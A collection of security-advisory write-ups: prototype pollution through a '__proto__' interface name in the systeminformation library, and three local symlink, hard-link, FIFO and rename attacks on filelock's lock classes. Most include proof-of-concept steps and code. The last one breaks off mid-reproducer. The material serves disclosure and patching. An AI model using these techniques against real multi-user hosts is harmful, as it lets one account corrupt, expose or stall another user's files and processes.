items.summary:
## Summary

`networkStats()` keeps a per interface cache for computing `rx_sec` / `tx_sec` between calls.
The cache is a plain JavaScript object and is indexed with the interface name the caller
supplied. Passing the name `__proto__` makes every cache write land on `Object.prototype`
instead of the cache, polluting every object in the Node.js process.

An application is affected if it passes untrusted input as the `ifaces` argument of
`si.networkStats()` and runs on FreeBSD, OpenBSD or NetBSD.

## Details

### The vulnerable code

`lib/network.js` declares the cache as a plain object:

```js
const _network = {};
```

`calcNetworkSpeed()` writes into it, keyed by the interface name:

```js
} else {
  if (!_network[iface]) {
    _network[iface] = {};
  }
  _network[iface].rx_bytes  = rx_bytes;
  _network[iface].tx_bytes  = tx_bytes;
  _network[iface].rx_sec    = null;
  _network[iface].tx_sec    = null;
  _network[iface].ms        = Date.now();
  _network[iface].last_ms   = 0;
  _network[iface].operstate = operstate;
}
```

With `iface === '__proto__'` this misbehaves twice:

1. `_network['__proto__']` does not read a missing own property — it invokes the inherited
   `__proto__` getter and returns `Object.prototype`, which is truthy. The
   `if (!_network[iface])` guard therefore never creates the `{}` placeholder.
2. Each following assignment writes onto `Object.prototype`.

After one call, `rx_bytes`, `tx_bytes`, `rx_sec`, `tx_sec`, `ms`, `last_ms` and `operstate`
are visible on **every** object in the process. A second call takes the other branch
(`_network['__proto__'].ms` is now truthy) and keeps them updated.

### Why the existing sanitizing does not help

The interface name does pass through `util.sanitizeString(iface, true)` before it is used as
the cache key. That function is a **shell metacharacter** filter, built to stop command
injection in the `netstat` / `ifconfig` invocations — a different threat. Property names made
of letters and underscores are legitimate interface names and pass through untouched:

```
"a;id"        -> "aid"
"a$(id)"      -> "aid"
"a|id"        -> "aid"
"a`id`"       -> "aid"
"__proto__"   -> "__proto__"     <-- unchanged
"constructor" -> "constructor"   <-- unchanged
```

The sanitizer is doing its job; the gap is that no layer treats the value as an *object key*.

### Reachability

The cache write is guarded incidentally on three of four platform branches. These guards exist
for unrelated reasons and are not a deliberate defence:

| Platform | Code path | Reachable with an arbitrary name? |
| --- | --- | --- |
| Linux / Android | `fs.existsSync('/sys/class/net/' + ifaceSanitized)` | **No** — a non-existent interface returns early |
| macOS | requires `netstat` to emit a data row beyond the header | **No** — verified on macOS 27, `Object.prototype` stays clean |
| Windows | `if (rx_bytes && tx_bytes)` — requires a real adapter match | **No** |
| **FreeBSD / OpenBSD / NetBSD** | `if (!error) { …; result = calcNetworkSpeed(ifaceSanitized, …) }` | **Yes** — the call sits outside the parsing loop, so any successful `netstat` exit reaches it, and `netstat -ibndI <unknown>` prints only its header and exits `0` |

The important part is not that three platforms happen to be safe, but that nothing in the
design prevents the write. Any future platform branch without such a guard reopens the issue,
which is why the fix is applied at the cache rather than at the call sites.

### Age

The pattern predates the v5 line — `git log -S "_network[iface] = {}"` traces it back to a
refactoring before `v3.42.5`. The v3 and v4 lines are end of life; the advisory covers v5.

## Impact

The attacker controls which attributes appear on `Object.prototype` but not their values —
those come from the interface statistics (`rx_bytes`, `ms`, `operstate` …). The attribute
*names* are fixed by the library, so this is not an arbitrary-key pollution primitive.

The consequences are therefore application specific and arise from name collisions:

- Any application code that tests `if (obj.operstate)`, `if (obj.ms)` or similar on an object
  that should not have those properties now takes the wrong branch.
- `for…in` loops over plain objects gain seven extra enumerable keys, which can corrupt
  serialisation, configuration merging or validation logic.
- Libraries that use `{}` as a lookup map and check membership with `in` or truthiness can
  return values for keys that were never inserted.

No path to remote code execution is known, and the values cannot be chosen by the attacker.

## Proof of concept

### The underlying primitive (any platform)

```js
const { calcNetworkSpeed } = require('systeminformation/lib/network.js'); // internal
const cache = {};                       // the declaration used by the library
calcNetworkSpeed('__proto__', 1, 2, 'up', 0, 0, 0, 0);

console.log({}.rx_bytes);               // 1
console.log({}.operstate);              // 'up'
console.log(Object.prototype.hasOwnProperty('rx_bytes')); // true
```

### End to end through the public API (FreeBSD / OpenBSD / NetBSD)

```js
const si = require('systeminformation');

(async () => {
  console.log('before:', {}.operstate);   // undefined
  await si.networkStats('__proto__');     // an attacker supplied interface name
  console.log('after :', {}.operstate);   // 'up'  -> Object.prototype is polluted
})();
```

On Linux, macOS and Windows the same call returns an empty result set and leaves
`Object.prototype` untouched, for the reasons in the *Reachability* table.

## Patch

`lib/network.js` — give the cache a null prototype, so `__proto__` becomes an ordinary own
property instead of a setter into the prototype chain:

```diff
-const _network = {};
+const _network = Object.create(null);
```

This is the smallest change that fixes the class of problem rather than one reachable path:

- It is independent of the platform branches, so no guard has to be added or maintained.
- It keeps behaviour identical for every legitimate interface name — `Object.keys()`,
  member reads and writes all work unchanged on a null prototype object.
- It matches the pattern already used elsewhere in the codebase
  (`lib/filesystem.js:114-115`, `lib/graphics.js:1060`, `lib/graphics.js:1087`).
- `Object.create` is ES5.1, well below the declared `engines.node >= 10.0.0`.

After the patch the hostile name is stored as a normal cache entry:

```js
const cache = Object.create(null);
// ... cache['__proto__'] holds the stats object, Object.prototype is untouched
```

## Workarounds

For users who cannot upgrade immediately, either of these is sufficient:

1. **Validate the interface name before calling** — accept only names returned by
   `si.networkInterfaces()`, or reject the names `__proto__`, `constructor` and `prototype`.
2. **Never pass untrusted input** as the `ifaces` argument. Passing `'*'` or omitting the
   argument is unaffected, because those names come from the system rather than the caller.

Freezing `Object.prototype` (`Object.freeze(Object.prototype)`) also prevents the write, but it
has wide-reaching side effects on other dependencies and is not recommended as a general
mitigation.

## Affected versions

All `5.x` releases up to and including `5.33.12`. Earlier major lines contain the same pattern
but are end of life.

### What was verified, and what was not

Verified on this machine (macOS 27, Node 24):

- the pollution primitive, by calling the cache write with `iface = '__proto__'`;
- that `util.sanitizeString('__proto__', true)` returns the string unchanged, while shell
  metacharacters are stripped;
- that unpatched v5 on macOS does **not** pollute through the public API;
- that `netstat -bdnI <unknown-interface>` prints only its header and exits `0`;
- that the patch stores the hostile key as an own property and leaves `Object.prototype` clean.

Not verified, because no such host was available:

- end to end exploitation on FreeBSD, OpenBSD or NetBSD. That conclusion is derived from
  reading the BSD branch of `networkStatsSingle()` — where the `calcNetworkSpeed()` call sits
  outside the row parsing loop and is reached whenever `netstat` exits successfully — combined
  with the observed `netstat` exit behaviour above. Worth confirming on a BSD host before
  publishing, since the affected-platform list depends on it.

items.summary:
### Summary

`ReadWriteLock` and `AsyncReadWriteLock` resolve the lock path with `pathlib.Path.resolve()` and pass it to `sqlite3.connect()` without refusing a symlink. A local user who can create names in the lock's directory, such as `/tmp` or a shared cache, can plant a symlink at the lock path and make the victim's process create, lock, or write the file it points to, or break mutual exclusion between the victim's own processes.

### Details

`ReadWriteLock.__init__` stores `pathlib.Path(lock_file).resolve()`, which follows a final symlink, and every connection opens that path through `sqlite3.connect()` with no `O_NOFOLLOW` or regular-file check. SQLite's own VFS also resolves the final symlink in user space, so `fs.protected_symlinks` and the sticky bit do not help: the kernel never sees a symlink to refuse. The other lock classes do not follow a final symlink: `FileLock` opens with `O_NOFOLLOW`, and `SoftReadWriteLock` coordinates through `<path>.rw/`.

### Proof of concept

On Linux, with the victim and attacker as different users and `/shared` mode 1777 with `fs.protected_symlinks=1`:

1. The attacker runs `ln -s /home/victim/private/pwned.flag /shared/app.rwlock.db`.
2. The victim constructs `ReadWriteLock("/shared/app.rwlock.db")`. A plain `os.open(..., O_NOFOLLOW)` on the same path fails, but the lock creates `/home/victim/private/pwned.flag`, owned by the victim, inside a directory the attacker cannot write.
3. With `/shared/cache.rwlock.db -> /shared/a.db`, one victim process holds the write lock. The attacker repoints the link to `/shared/b.db`, and a second victim process acquires the write lock while the first still holds it.

The same behavior reproduces on macOS, on Windows 11, and through `AsyncReadWriteLock`.

### Impact

A local attacker with write access to the lock directory can make the victim create empty files it owns at paths the attacker cannot write, make the victim hold a SQLite lock on another application's database so that application gets `database is locked`, and give two victim processes the write lock at once, letting them corrupt the resource the lock protects.

### Workarounds

Keep `ReadWriteLock` paths in directories that only trusted users can write.

items.summary:
`SoftReadWriteLock` (and `AsyncSoftReadWriteLock`, which wraps one) refreshes its holder record (the file under `<path>.rw/holders/` that says a process holds or wants the lock) on every poll of a waiting acquire and on every heartbeat (the periodic refresh a holder runs to keep its record fresh). It does so by reopening `<path>.rw/holders/<token>` by name with a plain blocking `O_WRONLY | O_NOFOLLOW` open and writing at offset 0, without checking what it opened. `O_NOFOLLOW` makes the open fail only when the final name is a symbolic link (a file that redirects to another path).

A different local user (the other user below) who owns the lock's `.rw` tree reads the token of the user running the lock (the lock user below) from the `holders/` listing and renames another node over the record. The other user owns the tree because it created it first in a sticky directory such as `/tmp` (the sticky bit is a directory flag that lets only a file's owner rename or remove it), or because it can write a lock directory without the sticky bit.

A FIFO (a named pipe: a file whose open for writing blocks until some process opens it for reading) makes the lock user's `write_lock()` / `read_lock()` hang regardless of `timeout`. It also stops a lock holder's heartbeat thread without `on_compromise` (the callback that tells a holder it lost the lock) ever running, so the lock grants a second process while the first still believes it holds it. This works on a default Linux.

Where the kernel lets a user hard-link a file it does not own (a hard link is a second name for the same file; Linux with `fs.protected_hardlinks=0`; macOS and the BSDs by their defaults, not executed), a hard link makes the lock user overwrite the first ~135 bytes of one of its own private files with its holder record. Affected versions: filelock >= 4.0.0 and <= 4.2.0. Anthropic's OSS Scanner reported it in private as `ANT-2026-AT33VEVC` [medium, CWE-62], titled "SoftReadWriteLock holder refresh writes through hard links, hangs on FIFOs".

## Severity

**CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H, 6.1 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:L` (low attack complexity): on a default Linux there is no race. `PR:L` (low privileges): a local user with ordinary privileges is enough. `UI:N` (no user interaction): the lock user's process acts on its own. `C:N` (no confidentiality impact): the other user learns nothing. `I:L` (low integrity impact): where the kernel permits hard links to files one does not own, the lock user also writes its holder record over the first ~135 bytes of one of its private files. The bytes are filelock's record, not chosen by the other user, so the change stays within that record. `A:H` (high availability impact): the other user makes a lock user's acquire outlast any `timeout` and leaves a holder's heartbeat thread asleep. The lock then evicts the holder without telling it, and two processes believe they hold the write lock.

Classification from the external review: conditional security. The owner of a planted `.rw` tree can make the refresh open a FIFO and stall a lock user, including its heartbeat. Overwriting a file of the lock user through a hard link also needs a permissive hard-link policy. The scanner rated it medium.

## Scope and preconditions

- Trust boundary: the other party is a different local account that owns the lock's `.rw` tree. Either it created `<path>.rw` (with `gen/` and `holders/`) before the lock's first use in a sticky directory such as `/tmp`, where `prepare()` adopts an existing tree whoever owns it and whatever its mode. Or the lock lives in a directory without the sticky bit that the account can write (the scanner checked a root-created `0777` directory). There being first is not needed, because the other user renames the lock user's own `0700` tree aside and puts its own in place; `prepare()` does not run again for a live lock object, and a waiting lock user recreates its record in the replacement. A tree the lock user already created in a sticky directory (mode `0700`) is out of reach.
- FIFO variant: needs only that boundary. It works on a default Linux. `fs.protected_hardlinks` plays no part, and `fs.protected_fifos=1` (a Linux setting that refuses some opens of FIFOs in sticky world-writable directories) does not help, since it covers `O_CREAT` opens in sticky directories only, and the other user renames the FIFO into place inside its own `holders/`.
- Hard-link variant: also needs a kernel that permits a hard link to a file the caller does not own. That is Linux with `fs.protected_hardlinks=0` (the kernel's built-in value; observed), while most distributions and the scanner's test image boot with `1`, under which the other user's `link()` fails with `EPERM` (operation not permitted) and the file stays untouched. macOS and the BSDs have no such restriction by default; that follows from their `link(2)` semantics, and the scanner did not execute it. The target must be a regular file the lock user may write, on the same filesystem as the lock, in a directory the other user can search. A `0600` file in a `0755` home directory qualifies; a file under a `0700` directory does not.
- Platform: observed on Linux 6.1. `AsyncSoftReadWriteLock` runs the same code through an executor thread and loses that thread (from the code, not run). On Windows named pipes cannot live in a regular directory, so there is no FIFO case there.
- Ancestor boundary: protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky.

## Affected code

At the scanned commit `b831496b0273`, [`OsFiles.overwrite` opens by name with `O_WRONLY | O_NOFOLLOW` and writes without `fstat`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L94-L100) (`fstat` would report the type of the file behind the open descriptor), while [`read` just above it uses `O_NONBLOCK` and a regular-file check](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L36-L43). The blocking open is [`_attempt_open`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L156-L160) via [`_open`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L143). [`prepare` adopts an existing tree whoever owns it](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L121-L133). The single caller is [`Participant._refresh_nonce`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L544-L545), reached from [`_keep_claim_fresh`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L487-L496) on every poll of a waiting acquire and from [`heartbeat`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L547-L560), which knows only `lost` and `transient`, not a call that does not return. The acquire loop checks its deadline and the `_closed` flag only after `advance()` returns ([`_sync.py` lines 584–592](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_sync.py#L584-L592)). The code maps the heartbeat outcome at [lines 603–613](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_sync.py#L603-L613), and release joins the heartbeat thread for `heartbeat_interval + 1` at [line 446](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_sync.py#L446).

## Introduced

The unguarded reopen came with `f974328` ("fix(soft-rw): replace the state mutex with a generation log (#738)", 2026-09-17), which dropped the earlier marker code's check of the opened descriptor. It was first released in 4.0.0 (verified with `git tag --contains f974328`, which answers 4.0.0).

## Mechanism

`OsFiles.overwrite()` refreshes a holder record by opening `holders/<token>` by name and writing at offset 0. `O_NOFOLLOW` refuses a symbolic link at that name (a planted one ends the acquire with `OSError: [Errno 40]` and the target untouched). A hard link is an ordinary directory entry, and a FIFO is not a symbolic link either. Nothing between the open and the write checks that the descriptor is the file `create()` made. Another user who can rename inside `holders/` has two ways to use the one unguarded reopen, depending on the node it puts under the lock user's record name:

1. The other user can write `holders/`. `prepare()` uses an existing protocol tree whoever owns it; it checks only the node type. In sticky `/tmp`, the user who creates `/tmp/app.lock.rw/{gen,holders}` before the lock's first use owns `holders/` and may rename over anything the lock user creates in it. In a shared directory without the sticky bit, being first is not needed.
2. The lock user publishes its record and drops the descriptor. `Participant.publish()` calls `OsFiles.create()`, which opens `holders/<token>` with `O_CREAT | O_EXCL`, writes the record and closes. The token is the file name, so the other user reads it from a listing of its own directory.
3. The other user swaps the name. Hard link: `link("/home/victim/accounts.csv", "holders/link")`, then `rename("holders/link", "holders/<token>")`; `link(2)` needs search permission on `/home/victim` and write permission on `holders/`, nothing on the file. FIFO: `mkfifo` (mode `0666`) + `rename`, so the name is absent at no point and the lock user does not take the "record is gone, recreate it" branch.
4. The lock user writes by name. Each poll of a waiting acquire (`poll_interval`, 0.25 s) runs `advance()` → `_keep_claim_fresh()` → `_refresh_nonce()` → `overwrite()`. With the hard link the lock user owns the linked file, so `O_WRONLY` succeeds and `write_all` puts `encode_holder(...)` at offset 0 without truncating. The lock user's call then ends in an ordinary `Timeout`. A granted holder does the same from its heartbeat thread every `heartbeat_interval` (30 s by default). With `heartbeat_interval=0.5`, the holder also writes through a link planted one second after it got the write lock, and `lock.compromise` stays `None`.
5. The link disappears. On `Timeout` or release, `leave()` unlinks `holders/<token>`, which is now the other user's link. The target is back to one link and `holders/` is empty.

The scanner observed this with the hard link. `victim` runs `SoftReadWriteLock("/tmp/app.lock").write_lock(timeout=2)` and waits. `attacker`, who created `/tmp/app.lock.rw` first, renames a hard link to `/home/victim/accounts.csv` (mode `0600`, owner `victim`; the `attacker` account can neither read nor write it) over the record. The file keeps its size, owner and mode. It now begins `filelock-rw/1\ntoken=ea480210b6cacc96a657f16d93f7f284\npid=210\nhost=cfz?pidns-f0000217\nlease=90.0\nnonce=5f8f61dcf2607b56ef05c521bdade557\n`, followed by its original content from offset 135 on (the record length varies with the PID and the host name).

The same reopen with a FIFO: `open(fifo, O_WRONLY)` without `O_NONBLOCK` (the flag that makes such an open return at once) blocks until the FIFO has a reader. The scanner observed two cases on the image with its default settings.

In a waiting acquire, the code checks the deadline one level above the blocked call, so an `open` that does not return outlasts any `timeout`, and a `close()` from another thread. The lock user, with the FIFO in place of the hard link, is still inside `write_lock(timeout=2)` 12 s later, at `_storage.py:158 _attempt_open ← :143 _open ← :96 overwrite ← _protocol.py:545 _refresh_nonce ← :494 _keep_claim_fresh ← :464 advance ← _sync.py:584 _wait_for ← :512 _do_acquire_inner`; without the FIFO the same call raises `Timeout` after 2.0 s.

Inside filelock the only thing that ends the block is a peer's `read()` of the same name: its non-blocking open is a reader for a moment, the stuck open returns, and `write_all` then fails with `EPIPE` (broken pipe). Peers read a waiter's record only in `_sweep`, at most every `stale_threshold / 2` (`stale_threshold` is the age after which peers treat a record as abandoned). With a live holder on default settings `write_lock(timeout=2)` returned after 59.9 s with `BrokenPipeError` instead of `Timeout`, and with no live peer it was still blocked after 150 s. The blocked thread is also still inside `_acquire`'s `self._locks.transaction` section, so other threads acquiring through the same instance wait behind it.

For a holder's heartbeat, `heartbeat()` knows two failures. `overwrite` returning `False` is `lost`, an `OSError` is `transient`, and `_refresh` turns those into an `evicted` or a `refresh-failed` compromise. A blocked call is neither. With `heartbeat_interval=1, stale_threshold=3` and the FIFO renamed over the record after the grant: 6.5 s later `lock.compromise` is still `None`, `on_compromise` has not run, `release()` takes 2.0 s (the join timeout; 31 s with the default interval) and the `filelock-heartbeat-*` thread is still alive after it. For comparison, when someone deletes the record outright, the holder learns `evicted` at its next heartbeat.

When whoever planted the FIFO keeps it open with the pipe buffer full, the `open` succeeds and `write_all` is what blocks, and peers' reads no longer disturb it. Run that way with the same intervals, a second process read the record as `b""`, evicted the holder after `stale_threshold` and got the write lock 3.0 s later, while the first process was still in its critical section with `lock.compromise is None` and `on_compromise` not called.

## Evidence

The scanner's reproducer runs as root and starts each party under its own account with `runuser`. It writes `0` to `/proc/sys/fs/protected_hardlinks` for the run (restored afterwards; this is why it needs the privileged container), creates `/home/victim/accounts.csv` (20 lines of CSV, owner `victim`, mode `0600`) and shows that `attacker` cannot write it. Then `attacker_creates_lock_tree_first.py` creates `/tmp/app.lock.rw`, `gen/` and `holders/` with mode `0777` and one snapshot naming some other writer, so the lock user's acquire polls instead of getting the lock at once. `victim_app.py` runs `SoftReadWriteLock("/tmp/app.lock").write_lock(timeout=2)`. `attacker_plants_hard_link.py` waits for the lock user's record to appear in `holders/`, hard-links `accounts.csv` beside it and renames the link over the record. The FIFO variant is one line away (`os.mkfifo(...)` + `chmod 0o666` in place of `os.link`) and needs no sysctl change: the lock user's program prints nothing and is still running after 8 s with `timeout=2`, and `kill -ABRT` prints the stack quoted above. The same run with `root` taking the lock overwrote a `0600` file in `/etc` that only root can access.

Our verification: `BUG` on the scanned commit `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #842 stack head the stock reproducer reaches no verdict, because the stack's owner check refuses the `/tmp/app.lock.rw` owned by the other account with `RuntimeError` before the lock user publishes a record (the target stays untouched). With that owner check disabled, the stock reproducer prints `OK` with `accounts.csv` intact. The independent review's FIFO variant (`mkfifo` + rename, no sysctl change) shows the 4.2.0 lock user not returning within 15 s (container killed at 300 s) against `Timeout after 2.0 s` on the PR head.

## Impact

On a default Linux (`fs.protected_hardlinks=1`) the reachable effect is the FIFO hang. The other user makes a lock user's `acquire_read` / `acquire_write` / `read_lock` / `write_lock` hang whatever `timeout` the caller passed. That user could already keep the lock busy, in which case the lock user gets `Timeout` on time; the FIFO takes that away. Against a process that holds the lock, the FIFO stops the heartbeat thread, which is the only path by which a holder learns of its eviction. After `stale_threshold` (90 s by default) a second process takes the lock and nothing tells the first, so a live holder and its evictor both believe they hold the write lock and `on_compromise` does not run.

A user who owns the tree can already get a reader granted beside a live writer by writing one forged `gen/<N+1>` snapshot. What this bug adds is the acquire that outlasts its `timeout` and the heartbeat thread that does not return. The FIFO variant touches nothing outside the lock's own directory.

Where the kernel allows the hard link, a different local user corrupts files it has no access to, with the rights of the process that takes the lock. filelock's holder record replaces the first 135 bytes or so of the target. The other user does not choose the bytes, so the result is data destruction, not code execution: the header of a database or archive, the first lines of a configuration or credential file. This is the hard-link counterpart, on a derived name of the soft read-write lock, of the symbolic link fixes at the lock path recorded in the changelog (3.20.1 for lock file creation, 3.20.3 for `SoftFileLock`), which `O_NOFOLLOW` does not cover.

## Workarounds

- Keep the lock path in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share a `SoftReadWriteLock` between accounts through a `0777` or group-writable directory.
- In a sticky directory such as `/tmp`, make sure the locking account creates `<path>.rw` before anyone else can, and refuse to use a lock path whose `<path>.rw` belongs to another account.
- Keep `fs.protected_hardlinks=1` (the default on mainstream Linux distributions). It removes the file-overwrite variant, not the FIFO stall.

items.summary:
`UnixFileLock`, the backend of `FileLock` and `AsyncFileLock` on Unix, empties whatever regular file it finds at the lock path once it holds the `flock` (a kernel lock on an open file). With an explicit `mode` it also chmods that file (sets its permission bits), whether or not this acquire created it. Another local user who can rename or hard-link one of the files of the user running the lock (below: the lock user) onto the lock path gets that file truncated by the lock user's next `acquire()`. A hard link is a second name for the same file. With a mode such as `0o666` the file, still owned by the lock user, also becomes readable and writable by that other user. The other user can then read and alter everything the lock user writes to it afterwards.

`O_NOFOLLOW`, the defence added for the symlink variant (CVE-2025-68146), does not see a renamed file or a hard link. The rename route needs the file's directory to be writable without the sticky bit (a directory flag that lets only a file's owner remove or rename it). The hard-link route into a sticky directory such as `/tmp` needs `fs.protected_hardlinks=0`, a Linux kernel setting. Affected versions are every filelock release up to and including 4.2.0 (the truncation is as old as the project; the chmod since 3.10.2).

Anthropic's OSS Scanner reported this in private. Finding covered by this advisory:

- `ANT-2026-KO573NWI` [high, CWE-706]: UnixFileLock truncates and chmods victim files renamed onto the lock path.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N` scores 6.1 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): one rename or link, then wait for the lock user's next acquire; no race. `I:H` (high integrity impact): the lock user's own process truncates a file it did not mean to touch, including content behind a second name the other user could neither modify nor delete. With a permissive explicit `mode` the other user can then write to it. If that file is one the lock user later executes or trusts, that is code execution as the lock user. `C:L` (partial confidentiality impact): the old content is gone before the other user can read anything, but what the lock user writes afterwards through a descriptor (the number the kernel gives a process for an open file) it still holds is readable. `A:N` (no availability impact). `S:U` (scope unchanged).

Classification from the review: **security, conditional** on another user controlling names in a non-sticky directory on the lock's filesystem (or on `fs.protected_hardlinks=0`). The scanner rated this high. The maintainers score it medium because the reachable targets depend on the directory layout and kernel settings described below.

## Scope and preconditions

- Lock classes: `FileLock` and `AsyncFileLock` on Unix (`UnixFileLock`). `SoftFileLock` applies an explicit mode only to a file it created with `O_CREAT | O_EXCL` and does not truncate an existing file. `WindowsFileLock` has not truncated at any version.
- The other user must put a regular file of the lock user at the lock path before the lock user's next acquire, while the lock file does not exist yet. That is the case on first use, after a reboot, after a `/tmp` cleaner, or after a release with the default `preserve_lock_file=False`, which unlinks the file. The scanner checked three ways at the scanned commit, with default kernel settings unless stated:
  - rename inside a directory without the sticky bit (a group-writable project or cache directory, a root-created `0777` directory);
  - rename from such a directory into a sticky one (`1777`) on the same filesystem. The sticky bit only protects entries that already exist, so the move succeeds while the lock path is free. Once the lock user's lock file exists there, the same move fails with `EPERM`;
  - `link(2)` into a sticky directory. This needs a system that lets a user hard-link a file it cannot write, which on Linux means `fs.protected_hardlinks=0`. Mainstream distributions set 1, which refuses the link. The scanner did not test macOS or the BSDs.
- What the lock user loses: with the default `FileLock(path)` the lock truncates the file, which keeps its mode. With an explicit `mode` (a lock shared between users needs `0o666` or `0o660`, because `UnixFileLock` opens the file read-write), the lock also chmods the file to that mode. `_apply_explicit_mode` suppresses `PermissionError` only for files the lock user does not own. The lock user owns its own files, so the `fchmod` succeeds.
- Trust boundary: the protection against another local user holds only when no other user can rename entries in the lock's directory or, for the rename-into-sticky route, in any directory on the same filesystem that holds a file of the lock user. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against.
- Not affected: a symlink (a file that points at another path) at the lock path, because `O_NOFOLLOW` makes the open fail with `ELOOP`; mutual exclusion between cooperating processes.

## Affected code

Scanned commit `b831496b0273`: [`UnixFileLock._finalize_locked_fd`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L144-L163), whose [`os.ftruncate` and `_apply_explicit_mode` calls](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L150-L154) have only the `st_nlink != 0` guard (the file still has at least one name); [`_apply_explicit_mode`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L165-L168); [`_open_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L95-L121), which learns from its `O_EXCL` create whether this attempt made the file but hands that flag only to the `ENOSYS` fallback.

## Introduced

The truncation of whatever is at the lock path dates from the initial commit ([2157efb](https://github.com/tox-dev/filelock/commit/2157efb8b57666699fcf15bf03c3771c1571279c), which opened with `O_TRUNC`). The chmod of a pre-existing inode (the kernel's identity for a file, independent of its name) came with [d7e1e84](https://github.com/tox-dev/filelock/commit/d7e1e84e71ad) "changed from os.umask to os.chmod" ([#206](https://github.com/tox-dev/filelock/pull/206), 2023-03-22), first tag 3.10.2 (verified with `git tag --contains`). Before it the code passed the mode only to `open()`, which applies it to a file this call creates. The advisory range is therefore every release up to 4.2.0. The earlier group range `>= 3.10.0` understated it, as the review noted.

## Mechanism

`_open_lock_file` first tries `os.open(path, O_RDWR | O_NOFOLLOW | O_CREAT | O_EXCL, mode)`. With the lock user's file renamed to the lock path that fails with `FileExistsError`. The second `os.open(path, O_RDWR | O_NOFOLLOW)` succeeds, because the entry is a regular file the lock user owns, and returns `created = False`. `_acquire_native` passes `created` only to the `ENOSYS` branch. No process holds a `flock` on the renamed file, so `_lock_fd_nonblocking(fd)` succeeds at once and `_finalize_locked_fd(fd)` runs: `os.fstat`, `st_nlink != 0`, `os.ftruncate(fd, 0)`, then `os.fchmod(fd, mode)` when the lock has an explicit mode. Nothing in that path tells a lock file from any other regular file; a link count of 2 and a non-empty file both pass. `O_NOFOLLOW` does not help because the entry is the file itself (or a hard link, an ordinary directory entry for the same inode), not a symlink to it. There is no race: the other user renames or links once and waits for the next acquire. `AsyncUnixFileLock` inherits `_finalize_locked_fd` unchanged.

The scanner measured three variants at the same commit, same accounts (`victim` uid 1000, `attacker` uid 1001). First, a rename within a `0777` directory: the next `FileLock("jobs.lock", mode=0o666)` of `victim` empties the `0600` journal of `victim` renamed to `jobs.lock` and sets it to `0666`; `attacker` then reads what `victim` keeps writing through its open descriptor. Second, a rename of a two-name file (`ln /tmp/cache/blob ~/env/blob`, `0644`) from a `0777` directory, `fs.protected_hardlinks=1`: after `mv /tmp/cache/blob /tmp/cache/app.lock` and `FileLock("/tmp/cache/app.lock", mode=0o666)` as `victim`, `~/env/blob` has `2 links, mode 666, 0 bytes` and `echo pwned >> /home/victim/env/blob` as `attacker` succeeds, in a directory `attacker` cannot write. Third, `os.link(notes, lock_path)` in a `1777` directory with `fs.protected_hardlinks=0`: `notes.txt` (`0644`, in the home of `victim`) ends up 0 bytes with mode `0666`, and `open(notes, "w")` as `attacker` then succeeds. With plain `FileLock(lock_path)` a `0600` file ends up empty with its mode unchanged. The planted name stays after release, so every later acquire truncates the file again.

```python
os.chmod(shared, 0o777)
journal = f"{shared}/victim-journal.log"
lock_path = f"{shared}/jobs.lock"

victim = subprocess.Popen(
    ["runuser", "-u", "victim", "--", sys.executable, "/tmp/repro.d/victim_job_runner.py", shared],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    text=True,
)


def victim_runs(job):
    victim.stdin.write(job + "\n")
    victim.stdin.flush()
    assert victim.stdout.readline() == "done\n"


def as_attacker(script, argument):
    command = ["runuser", "-u", "attacker", "--", sys.executable, f"/tmp/repro.d/{script}", argument]
    return subprocess.run(command, capture_output=True, text=True, check=True).stdout


# before the attack: one job leaves the lock file and a 0600 journal with one line in it
victim_runs("job 1")
journal_before = os.stat(journal)
journal_content_before = open(journal).read()
attacker_read_before = as_attacker("attacker_read_file.py", journal)
print(
    f"CONTROL  journal: inode {journal_before.st_ino}, uid {journal_before.st_uid}, "
    f"mode {stat.S_IMODE(journal_before.st_mode):o}, content {journal_content_before!r}"
)
print(f"CONTROL  attacker reads the journal: {attacker_read_before!r}")

# attack
as_attacker("attacker_rename_journal.py", shared)

# the victim takes its lock again, then notes a secret in its journal through the descriptor it holds
secret = secrets.token_hex(8)
victim_runs(f"job 2 {secret}")
